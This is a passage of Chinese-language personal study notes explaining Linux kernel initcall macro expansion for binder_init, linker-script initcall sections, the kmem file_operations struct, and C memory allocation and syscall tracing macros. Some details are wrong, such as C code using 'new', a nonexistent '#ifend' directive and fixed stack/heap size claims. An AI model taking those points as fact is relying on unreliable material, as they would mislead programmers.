</code></p>\n<p>__section(“.init.text”)：</p>\n<p>这个指令将函数放置在输出可执行文件的特定段中，本例中为“.init.text”段。这个段通常用于系统启动时需要的初始化程序，初始化完成后可以丢弃，以节省内存。<br>__cold：</p>\n<p>这个属性告诉编译器，该函数不太可能经常执行。这可以帮助编译器优化代码以提高性能，可能通过安排函数的方式来减少其在不经常使用时对指令缓存性能的影响。<br>__latent_entropy：</p>\n<p>这个属性用于增加系统的熵（随机性），这在安全方面特别有用，例如，使依赖于可预测执行模式的攻击更加困难。<br>__noinitretpoline：</p>\n<p>这个属性表明该函数不需要retpoline（返回跳板），这是一种针对某些类型的投机执行侧通道攻击（如Spectre）的缓解技术。<br>__nocfi：</p>\n<p>这个指令告诉编译器不对这个函数应用控制流完整性（CFI）检查。控制流完整性是一种安全特性，通过确保间接函数调用转到有效函数来帮助防止某些类型的攻击。对于某些低级函数，跳过CFI可能是必要的，因为CFI的开销或限制可能会干扰函数的操作。</p>\n<h4 id=\"从device-initcall查看宏定义\"><a href=\"#从device-initcall查看宏定义\" class=\"headerlink\" title=\"从device_initcall查看宏定义\"></a>从device_initcall查看宏定义</h4><p>device_initcall(binder_init)就是将指向binder_init的函数指针，注册在.initcall6.init段里。内核启动时，会调用它，对Binder驱动进行初始化。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">typedef int (*initcall_t)(void);</span><br><span class=\"line\">typedef initcall_t initcall_entry_t;</span><br><span class=\"line\"></span><br><span class=\"line\">/* Format: &lt;modname&gt;__&lt;counter&gt;_&lt;line&gt;_&lt;fn&gt; */</span><br><span class=\"line\">#define __initcall_id(fn)\t\t\t\t\t\\</span><br><span class=\"line\">\t__PASTE(__KBUILD_MODNAME,\t\t\t\t\\</span><br><span class=\"line\">\t__PASTE(__,\t\t\t\t\t\t\\</span><br><span class=\"line\">\t__PASTE(__COUNTER__,\t\t\t\t\t\\</span><br><span class=\"line\">\t__PASTE(_,\t\t\t\t\t\t\\</span><br><span class=\"line\">\t__PASTE(__LINE__,\t\t\t\t\t\\</span><br><span class=\"line\">\t__PASTE(_, fn))))))</span><br><span class=\"line\"></span><br><span class=\"line\">/* Format: __&lt;prefix&gt;__&lt;iid&gt;&lt;id&gt; */</span><br><span class=\"line\">#define __initcall_name(prefix, __iid, id)\t\t\t\\</span><br><span class=\"line\">\t__PASTE(__,\t\t\t\t\t\t\\</span><br><span class=\"line\">\t__PASTE(prefix,\t\t\t\t\t\t\\</span><br><span class=\"line\">\t__PASTE(__,\t\t\t\t\t\t\\</span><br><span class=\"line\">\t__PASTE(__iid, id))))</span><br><span class=\"line\">      </span><br><span class=\"line\">#define __initcall_section(__sec, __iid)\t\t\t\\</span><br><span class=\"line\">\t#__sec &quot;.init&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">#define __initcall_stub(fn, __iid, id)\tfn</span><br><span class=\"line\"></span><br><span class=\"line\">#define ____define_initcall(fn, __unused, __name, __sec)\t\\</span><br><span class=\"line\">\tstatic initcall_t __name __used \t\t\t\\</span><br><span class=\"line\">\t\t__attribute__((__section__(__sec))) = fn;</span><br><span class=\"line\">#endif</span><br><span class=\"line\"></span><br><span class=\"line\">#define __unique_initcall(fn, id, __sec, __iid)\t\t\t\\</span><br><span class=\"line\">\t____define_initcall(fn,\t\t\t\t\t\\</span><br><span class=\"line\">\t\t__initcall_stub(fn, __iid, id),\t\t\t\\</span><br><span class=\"line\">\t\t__initcall_name(initcall, __iid, id),\t\t\\</span><br><span class=\"line\">\t\t__initcall_section(__sec, __iid))</span><br><span class=\"line\"></span><br><span class=\"line\">#define ___define_initcall(fn, id, __sec)\t\t\t\\</span><br><span class=\"line\">\t__unique_initcall(fn, id, __sec, __initcall_id(fn))</span><br><span class=\"line\"></span><br><span class=\"line\">#define __define_initcall(fn, id) ___define_initcall(fn, id, .initcall##id)</span><br><span class=\"line\"></span><br><span class=\"line\">#define device_initcall(fn)\t\t__define_initcall(fn, 6)</span><br></pre></td></tr></table></figure>\n\n<p>device_initcall(binder_init)展开就是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">device_initcall(binder_init)</span><br><span class=\"line\">        ↓</span><br><span class=\"line\">__define_initcall(binder_init, 6)</span><br><span class=\"line\">        ↓</span><br><span class=\"line\">___define_initcall(binder_init, 6, .initcall6)</span><br><span class=\"line\">        ↓</span><br><span class=\"line\">__unique_initcall(binder_init, 6, .initcall6, &lt;modname&gt;__&lt;counter&gt;_&lt;line&gt;_binder_init)</span><br><span class=\"line\">        ↓</span><br><span class=\"line\">____define_initcall(binder_init, </span><br><span class=\"line\">        binder_init,</span><br><span class=\"line\">        __initcall__&lt;modname&gt;__&lt;counter&gt;_&lt;line&gt;_binder_init6,</span><br><span class=\"line\">        .initcall6.init)</span><br><span class=\"line\">        ↓</span><br><span class=\"line\">static initcall_t __initcall__&lt;modname&gt;__&lt;counter&gt;_&lt;line&gt;_binder_init6 __used </span><br><span class=\"line\">      __attribute__((__section__(.initcall6.init))) = binder_init;</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"initcall-id\"><a href=\"#initcall-id\" class=\"headerlink\" title=\"__initcall_id\"></a>__initcall_id</h5><p>这段代码定义了一个宏 __initcall_id(fn)，其目的是生成一个唯一的标识符，用于内核初始化函数（initcall）。这个宏通过多层嵌套的 __PASTE 宏，将几个预处理器变量和函数名结合成一个连续的字符串。下面是对这个宏的详细解释：</p>\n<p><em>组件解释</em></p>\n<ul>\n<li>__KBUILD_MODNAME：<br>这是一个由内核构建系统定义的宏，它表示正在编译的模块的名称。如果代码不是为模块编译的，它通常是内核的名称或为空。</li>\n<li>__COUNTER__：<br>这是一个特殊的预处理器变量，每次出现在源代码中时都会递增。__COUNTER__ 用于在编译过程中生成唯一的序列号，确保每次宏展开时都得到一个不同的值。是GNU 编译器的非标准编译器扩展，可以认为它是一个计数器，代表一个整数，它的值一般被初始化为0，在每次编译器编译到它时，会自动 +1。</li>\n<li>__LINE__：<br>这个宏展开为当前代码行的行号。它在源代码中是唯一的，除非多个宏展开发生在同一行。</li>\n<li>fn：<br>这是宏的参数，表示将要注册的初始化函数的名字。</li>\n<li>__PASTE 宏<br>__PASTE 宏的目的是将两个参数连接在一起（没有空格）。__initcall_id 宏通过多次使用 __PASTE，将上述元素拼接成一个单一的、唯一的标识符。这种连续使用 __PASTE 的方式确保了不同部分之间没有空格，并且生成的字符串是平滑连续的。</li>\n</ul>\n<p><em>完整的宏展开过程</em><br>    如果我们假设：<br>    __KBUILD_MODNAME 是 “mykernelmodule”<br>    __COUNTER__ 当前是 42<br>    __LINE__ 是 123<br>    fn 是 init_my_device<br>宏展开的结果将是：<code>mykernelmodule__42_123_init_my_device</code><br>这个结果是由以下步骤生成的：</p>\n<ol>\n<li>首先连接 mykernelmodule 和 _，结果是 mykernelmodule__。</li>\n<li>然后连接前面的结果和 42，得到 mykernelmodule__42。</li>\n<li>接着连接 _ 和 123，再和前面的结果连接，得到 mykernelmodule__42_123。</li>\n<li>最后将 init_my_device 通过 _ 连接上去，得到最终的字符串 mykernelmodule__42_123_init_my_device。</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#define __initcall_section(__sec, __iid)\t\t\t\\</span><br><span class=\"line\">\t#__sec &quot;.init&quot;</span><br><span class=\"line\">这个宏 __initcall_section(__sec, __iid) 定义了一个用于生成内核初始化代码段名的格式。宏的工作是把传入的 __sec 和字符串 .init 拼接起来，构成一个用于特定初始化函数的ELF段（section）名称。这里，__iid 参数虽然在宏定义中出现，但在实际的字符串连接操作中没有被使用，可能是为了保持与其他相关宏的参数格式一致性，或为未来的扩展预留。</span><br></pre></td></tr></table></figure>\n<p>详细解释：</p>\n<ul>\n<li>#__sec：<br>这部分使用了字符串化操作符 #，它会将宏参数转化为一个字符串。这意味着传入的宏参数 __sec 会被转换成一个字面量字符串。</li>\n<li>“.init”：<br>这是一个直接的字符串常量，表示初始化段的后缀。在Linux内核中，用于初始化代码的段通常以 .init 结尾，比如 .init.text、.init.data 等。<br>拼接：</li>\n</ul>\n<p>宏中没有明显的连接操作（如 ## 运算符），但在宏的用法中，这两部分（#__sec 和 “.init”）通过宏替换自然连接成一个完整的字符串。<br>使用例子：<br>假设有如下调用：</p>\n<p>__initcall_section(my_section, 123)<br>根据宏的定义，这将展开为：</p>\n<p>“my_section.init”<br>这里，my_section 被字符串化并与 .init 后缀连接，生成一个新的字符串，表示一个内核ELF段的名称。</p>\n<h4 id=\"initcall机制\"><a href=\"#initcall机制\" class=\"headerlink\" title=\"initcall机制\"></a>initcall机制</h4><p>当我们试图将一个驱动程序加载进内核时，我们需要提供一个<code>xxx_init()</code>函数。这样内核才会定位到该函数，加载驱动，初始化驱动。<br><code>binder_init()</code>就是这样一个初始化驱动的函数。但是怎么向内核注册这样一个函数呢？直观的做法是维护一个初始化驱动的函数指针的数组，将<code>binder_init()</code>添加进该数组中。不过这样在多人开发时，容易造成编码冲突。<br>linux采用了更优雅的方法——initcall机制：<br>在内核镜像文件中，自定义一个段，这个段里面专门用来存放这些初始化函数的地址，内核启动时，只需要在这个段地址处取出函数指针，一个个执行即可。</p>\n<h5 id=\"initcallXX-init段\"><a href=\"#initcallXX-init段\" class=\"headerlink\" title=\".initcallXX.init段\"></a>.initcallXX.init段</h5><p><code>.initcallXX.init</code>段就是专门用来存放各个内核模块的初始化函数的地址。</p>\n<p><code>device_initcall(fn)</code>就是表示将指向fn的函数指针，存放在<code>.initcall6.init</code>段。类似的宏定义有：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#define pure_initcall(fn)\t\t__define_initcall(fn, 0)              →  .initcall0.init</span><br><span class=\"line\">#define core_initcall(fn)\t\t__define_initcall(fn, 1)              →  .initcall1.init</span><br><span class=\"line\">#define core_initcall_sync(fn)\t\t__define_initcall(fn, 1s)             →  .initcall1s.init</span><br><span class=\"line\">#define postcore_initcall(fn)\t\t__define_initcall(fn, 2)              →  .initcall2.init</span><br><span class=\"line\">#define postcore_initcall_sync(fn)\t__define_initcall(fn, 2s)             →  .initcall2s.init</span><br><span class=\"line\">#define arch_initcall(fn)\t\t__define_initcall(fn, 3)              →  .initcall3.init</span><br><span class=\"line\">#define arch_initcall_sync(fn)\t\t__define_initcall(fn, 3s)             →  .initcall3s.init</span><br><span class=\"line\">#define subsys_initcall(fn)\t\t__define_initcall(fn, 4)              →  .initcall4.init</span><br><span class=\"line\">#define subsys_initcall_sync(fn)\t__define_initcall(fn, 4s)             →  .initcall4s.init</span><br><span class=\"line\">#define fs_initcall(fn)\t\t\t__define_initcall(fn, 5)              →  .initcall5.init</span><br><span class=\"line\">#define fs_initcall_sync(fn)\t\t__define_initcall(fn, 5s)             →  .initcall5s.init</span><br><span class=\"line\">#define rootfs_initcall(fn)\t\t__define_initcall(fn, rootfs)         →  .initcallrootfs.init</span><br><span class=\"line\">#define device_initcall(fn)\t\t__define_initcall(fn, 6)              →  .initcall6.init</span><br><span class=\"line\">#define device_initcall_sync(fn)\t__define_initcall(fn, 6s)             →  .initcall6s.init</span><br><span class=\"line\">#define late_initcall(fn)\t\t__define_initcall(fn, 7)              →  .initcall7.init</span><br><span class=\"line\">#define late_initcall_sync(fn)\t\t__define_initcall(fn, 7s)             →  .initcall7s.init</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"initcallXX-init段的定义\"><a href=\"#initcallXX-init段的定义\" class=\"headerlink\" title=\".initcallXX.init段的定义\"></a>.initcallXX.init段的定义</h4><p>.initcallXX.init段的定义是在common/include/asm-generic/vmlinux.lds.h和common/arch/arm64/kernel/vmlinux.lds.S中。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//common/include/asm-generic/vmlinux.lds.h</span><br><span class=\"line\">#define INIT_CALLS_LEVEL(level)\t\t\t\t\t\t\\</span><br><span class=\"line\">\t\t__initcall##level##_start = .;\t\t\t\t\\</span><br><span class=\"line\">\t\tKEEP(*(.initcall##level##.init))\t\t\t\\</span><br><span class=\"line\">\t\tKEEP(*(.initcall##level##s.init))\t\t\t\\</span><br><span class=\"line\"></span><br><span class=\"line\">#define INIT_CALLS\t\t\t\t\t\t\t\\</span><br><span class=\"line\">\t\t__initcall_start = .;\t\t\t\t\t\\</span><br><span class=\"line\">\t\tKEEP(*(.initcallearly.init))\t\t\t\t\\</span><br><span class=\"line\">\t\tINIT_CALLS_LEVEL(0)\t\t\t\t\t\\</span><br><span class=\"line\">\t\tINIT_CALLS_LEVEL(1)\t\t\t\t\t\\</span><br><span class=\"line\">\t\tINIT_CALLS_LEVEL(2)\t\t\t\t\t\\</span><br><span class=\"line\">\t\tINIT_CALLS_LEVEL(3)\t\t\t\t\t\\</span><br><span class=\"line\">\t\tINIT_CALLS_LEVEL(4)\t\t\t\t\t\\</span><br><span class=\"line\">\t\tINIT_CALLS_LEVEL(5)\t\t\t\t\t\\</span><br><span class=\"line\">\t\tINIT_CALLS_LEVEL(rootfs)\t\t\t\t\\</span><br><span class=\"line\">\t\tINIT_CALLS_LEVEL(6)\t\t\t\t\t\\</span><br><span class=\"line\">\t\tINIT_CALLS_LEVEL(7)\t\t\t\t\t\\</span><br><span class=\"line\">\t\t__initcall_end = .;</span><br><span class=\"line\">                </span><br><span class=\"line\">//common/arch/arm64/kernel/vmlinux.lds.S</span><br><span class=\"line\">SECTIONS</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        ...</span><br><span class=\"line\">        .init.data : &#123;</span><br><span class=\"line\">\t\tINIT_DATA</span><br><span class=\"line\">\t\tINIT_SETUP(16)</span><br><span class=\"line\">\t\tINIT_CALLS</span><br><span class=\"line\">\t\tCON_INITCALL</span><br><span class=\"line\">\t\tINIT_RAM_FS</span><br><span class=\"line\">\t\t*(.init.altinstructions .init.bss)\t/* from the EFI stub */</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">        ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>参考：<a href=\"https://www.cnblogs.com/jianhua1992/p/16852793.html\">https://www.cnblogs.com/jianhua1992/p/16852793.html</a><br>解释：</p>\n<ul>\n<li><em>()<br>在链接器脚本中确实用作通配符。在链接器脚本的语法中，</em>() 用于匹配符合特定模式的所有符号或者段(section)。这种用法允许链接器指令应用于多个相关的符号或段，而不需要单独列举它们。这是组织和控制链接输出文件的一个强大特性，特别是在操作系统内核或其他复杂软件系统的构建中。</li>\n</ul>\n<p>KEEP(<em>(.initcall##level##.init)) 和 KEEP(</em>(.initcall##level##s.init)) 使用了通配符 * 来包含所有在特定命名模式的段中的符号。这里的通配符 * 表示匹配所有符号，而括号内的表达式定义了要匹配的段名。例如：</p>\n<p>.initcall0.init<br>.initcall1.init<br>.initcall0s.init<br>.initcall1s.init</p>\n<p>*(.initcall##level##.init)：</p>\n<p>这表示匹配所有在 .initcall<level>.init 段中的符号。例如，如果 level 是 0，则匹配 .initcall0.init 段中的所有符号。<br>*(.initcall##level##s.init)：</p>\n<p>类似地，这表示匹配所有在 .initcall<level>s.init 段中的符号。这个 s 后缀可能代表某种特定类型的初始化调用，如同步初始化调用。<br>为什么使用 KEEP<br>KEEP 指令在链接器脚本中用来确保即使没有被程序的其他部分直接引用，也不会被链接器优化掉（即不被删除）。这对于初始化代码特别重要，因为这些代码在执行完毕后通常不会再被其他运行时代码直接引用，但它们在系统启动阶段是必需的。通过使用 KEEP，可以保证这些重要的初始化段不会因为“看似”未被使用而被剔除，确保内核能够按预期顺序执行这些初始化步骤。</p>\n<p>这种机制是内核和其他底层系统软件能够精确控制初始化过程的关键，特别是在涉及到内存和资源优化的上下文中。</p>\n<ul>\n<li>##在宏定义中的作用是将多个符号连接成一个符号，并不将其字符串化</li>\n</ul>\n<h3 id=\"标号元素\"><a href=\"#标号元素\" class=\"headerlink\" title=\"标号元素\"></a>标号元素</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">static const struct file_operations __maybe_unused kmem_fops = &#123;</span><br><span class=\"line\">    .llseek     = memory_lseek,</span><br><span class=\"line\">    .read       = read_kmem,</span><br><span class=\"line\">    .write      = write_kmem,</span><br><span class=\"line\">    .mmap       = mmap_kmem,</span><br><span class=\"line\">    .open       = open_kmem,</span><br><span class=\"line\">#ifndef CONFIG_MMU</span><br><span class=\"line\">    .get_unmapped_area = get_unmapped_area_mem,</span><br><span class=\"line\">    .mmap_capabilities = memory_mmap_capabilities,</span><br><span class=\"line\">#endif</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h4 id=\"解释\"><a href=\"#解释\" class=\"headerlink\" title=\"解释\"></a>解释</h4><ol>\n<li>结构体声明与类型<br>struct file_operations：这是一个预定义的结构体类型，通常在Linux内核源代码中定义，用于描述文件操作相关的函数指针。</li>\n<li>修饰符和存储类<br>static：表示这个结构体变量 kmem_fops 的作用域限制在定义它的文件内，外部文件不能访问它。<br>const：表示这个结构体变量是常量，一旦初始化后，其内容不应被修改。<br>__maybe_unused：这是一个编译器指示，用于告诉编译器这个变量可能在代码中未被使用，这可以避免编译器发出未使用变量的警告。这通常用在可能因为不同的编译配置而使用或不使用的变量上。</li>\n<li>结构体成员初始化<br>.llseek = memory_lseek，.read = read_kmem，等：这种使用点（.）后跟成员名的初始化方式是C99标准中引入的指定初始化器（designated initializer）。它允许在初始化结构体时直接指定每个成员的值，而不需要依赖于成员在结构体中的顺序。</li>\n<li>条件编译<br>#ifndef CONFIG_MMU … #endif：这是预处理指令，用于条件编译。它检查 CONFIG_MMU 是否未被定义。如果未定义 CONFIG_MMU，则编译器会编译这两行代码：<br>.get_unmapped_area = get_unmapped_area_mem<br>.mmap_capabilities = memory_mmap_capabilities<br>这通常在不同的硬件配置或内核配置选项下使用，以适应不同的系统需求。</li>\n</ol>\n<p>当在内核模块中将 memory_lseek 函数指定给 file_operations 结构体的 .llseek 成员时，任何针对该设备文件的 lseek 系统调用最终都会调用你的 memory_lseek 函数。</p>\n<h4 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h4><p>这里是详细的调用流程：</p>\n<p>用户空间调用：当用户空间的程序调用 lseek() 函数时，这个调用最初由标准C库（例如glibc）封装，该库将系统调用参数封装为适当的系统调用请求。<br>系统调用转换：系统调用接口在内核中接收到这个请求后，会找到与文件描述符关联的 file 结构体实例。<br>文件操作结构体：每个打开的文件在内核中都有一个与之关联的 file 结构体，这个结构体包含了指向 file_operations 结构体的指针。file_operations 结构体为各种文件操作定义了具体的函数指针，如打开、读取、写入、定位等。<br>调用 .llseek：如果对应的 file_operations 结构体中的 .llseek 成员被设置为 memory_lseek，那么内核就会调用 memory_lseek 函数来处理这个定位请求。<br>执行定位操作：memory_lseek 函数将根据提供的参数（文件指针、偏移量和起始位置标志）计算新的文件位置，并将这个新位置返回给调用者。如果操作有效，返回的就是新的文件偏移量；如果无效（如偏移量无效或操作不被支持），则返回错误码。</p>\n<p>c语言结构体大小计算规则：<br>1、结构体变量的首地址，必须是结构体变量中的“最大基本数据类型成员所占字节数”的整数倍。（对齐）<br>2、结构体变量中的每个成员相对于结构体首地址的偏移量，都是该成员基本数据类型所占字节的整数倍。（对齐）<br>3、结构体变量的总大小，为结构体变量中“最大基本数据类型成员所占字节数”的整数倍（补齐）</p>\n<p>–<br>typedef struct Work_{<br>    int num;</p>\n<p>}Work_;</p>\n<p>如果不对自己起别名，直接用<br>Work_ work=new Work_(); 会报错，必须用 struct Work_ work=new Work_();<br>–</p>\n<p>c:内存申请</p>\n<p>栈：占最大内存中的2M,开辟内存的方式是静态内存开辟，比如：函数内声明变量，函数方法结束后会自动回收<br>堆：占最大内存中的80%，动态内存开辟，不会自动回收,必须手动回收。malloc()开辟，free()释放</p>\n<p>利用realloc扩展内存，如果原来的内存不足以向下扩展，会重新找一块足够的内存，因此，指针指向的地址会变动。<br>动态申请内存时有可能会失败，所以会返回null,如果是扩展内存返回null,那么需要把malloc的内存释放掉<br>释放时，也务必进行空指针判断，释放完最好把指针置空<br>‘’’<br>//动态开辟内存<br>void dyMemoryTest(int num,int newNum){<br>    int* arrPoint= (int*)malloc(10<em>1024</em>1024*sizeof(int)); //40M</p>\n<pre><code>//必须手动释放\nif(arrPoint)&#123;\n    free(arrPoint);  \n&#125;\nint* arrPoint2=(int*)malloc(num*sizeof(int));\nif(arrPoint2)&#123;\n    for(int i=0;i&lt;num;i++)&#123;\n        *(arrPoint2+i)=i;\n    &#125;\n&#125;\nint* arrPoint3 =(int *)realloc(arrPoint2,(num+newNum)*sizeof(int));\nif(arrPoint3)&#123;\n    for(int i=num;i&lt;num+newNum;i++)&#123;\n        *(arrPoint3+i)=i;\n    &#125;\n    for(int i=0;i&lt;num+newNum;i++)&#123;\n        LOGD(&quot;the number is %d ,the value is %d&quot;,i,*(arrPoint3+i));\n    &#125;\n    //成功了，只释放旧指针就行\n    free(arrPoint3);\n    arrPoint3= nullptr;\n&#125;else&#123;\n    //没有成功，释放旧指针\n    if(arrPoint2)&#123;\n        free(arrPoint2);\n    &#125;\n&#125;\n</code></pre>\n<p>}<br>‘’’</p>\n<p>linux config example:</p>\n<p>CONFIG_FTRACE_SYSCALLS 是一个内核配置选项，用于控制是否启用系统调用的函数追踪（ftrace）功能.</p>\n<p>linux/syscalls.h</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#ifdef CONFIG_FTRACE_SYSCALLS</span><br><span class=\"line\">#define SYSCALL_METADATA(sname, nb, ...)\t\t\t\\</span><br><span class=\"line\">\tstatic const char *types_##sname[] = &#123;\t\t\t\\</span><br><span class=\"line\">\t\t__MAP(nb,__SC_STR_TDECL,__VA_ARGS__)\t\t\\</span><br><span class=\"line\">\t&#125;;\t\t\t\t\t\t\t\\</span><br><span class=\"line\">\tstatic const char *args_##sname[] = &#123;\t\t\t\\</span><br><span class=\"line\">\t\t__MAP(nb,__SC_STR_ADECL,__VA_ARGS__)\t\t\\</span><br><span class=\"line\">\t&#125;;\t\t\t\t\t\t\t\\</span><br><span class=\"line\">\tSYSCALL_TRACE_ENTER_EVENT(sname);\t\t\t\\</span><br><span class=\"line\">\tSYSCALL_TRACE_EXIT_EVENT(sname);\t\t\t\\</span><br><span class=\"line\">\tstatic struct syscall_metadata __used\t\t\t\\</span><br><span class=\"line\">\t  __syscall_meta_##sname = &#123;\t\t\t\t\\</span><br><span class=\"line\">\t\t.name \t\t= &quot;sys&quot;#sname,\t\t\t\\</span><br><span class=\"line\">\t\t.syscall_nr\t= -1,\t/* Filled in at boot */\t\\</span><br><span class=\"line\">\t\t.nb_args \t= nb,\t\t\t\t\\</span><br><span class=\"line\">\t\t.types\t\t= nb ? types_##sname : NULL,\t\\</span><br><span class=\"line\">\t\t.args\t\t= nb ? args_##sname : NULL,\t\\</span><br><span class=\"line\">\t\t.enter_event\t= &amp;event_enter_##sname,\t\t\\</span><br><span class=\"line\">\t\t.exit_event\t= &amp;event_exit_##sname,\t\t\\</span><br><span class=\"line\">\t\t.enter_fields\t= LIST_HEAD_INIT(__syscall_meta_##sname.enter_fields), \\</span><br><span class=\"line\">\t&#125;;\t\t\t\t\t\t\t\\</span><br><span class=\"line\">\tstatic struct syscall_metadata __used\t\t\t\\</span><br><span class=\"line\">\t  __section(&quot;__syscalls_metadata&quot;)\t\t\t\\</span><br><span class=\"line\">\t *__p_syscall_meta_##sname = &amp;__syscall_meta_##sname;</span><br><span class=\"line\"></span><br><span class=\"line\">static inline int is_syscall_trace_event(struct trace_event_call *tp_event)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\treturn tp_event-&gt;class == &amp;event_class_syscall_enter ||</span><br><span class=\"line\">\t       tp_event-&gt;class == &amp;event_class_syscall_exit;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">#else</span><br><span class=\"line\">#define SYSCALL_METADATA(sname, nb, ...)</span><br><span class=\"line\"></span><br><span class=\"line\">static inline int is_syscall_trace_event(struct trace_event_call *tp_event)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">#endif</span><br><span class=\"line\"></span><br><span class=\"line\">#ifend</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>if you define CONFIG_FTRACE_SYSCALLS in kconfig file,it will exe “ifdefine” block else it will exe “else” block. </p>\n<p>在C语言的宏定义中，## 操作符被称为“粘合”或“连接”操作符（token-pasting operator）。它的作用是将两个令牌（token）连接成一个新的令牌。这在宏定义和宏展开时非常有用，可以动态生成新的标识符或变量名。</p>\n<p>让我们详细解释一下：</p>\n<p>使用 ## 的例子<br>考虑以下宏定义：<br><code>#define CONCAT(a, b) a##b</code><br>如果我们使用这个宏：<br><code>CONCAT(foo, bar)</code><br>这将被预处理器展开为：<br><code>foobar</code></p>\n<p>在C语言的宏定义中，# 操作符被称为字符串化操作符（stringizing 